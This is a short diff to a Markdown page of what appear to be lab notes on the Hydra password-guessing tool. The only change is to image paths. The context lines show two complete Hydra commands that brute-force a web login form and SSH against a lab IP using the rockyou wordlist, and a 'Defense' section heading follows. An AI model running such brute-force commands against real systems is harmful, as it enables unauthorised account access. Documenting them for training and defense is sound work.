@@ -26,11 +26,11 @@ Examples:
 
 `hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
 
-![](<../../.gitbook/assets/image (238).png>)
+![](<../../../.gitbook/assets/image (238).png>)
 
 `hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.166.146 -t 4 ssh`
 
-![](<../../.gitbook/assets/image (247).png>)
+![](<../../../.gitbook/assets/image (247).png>)
 
 ## Defense
 
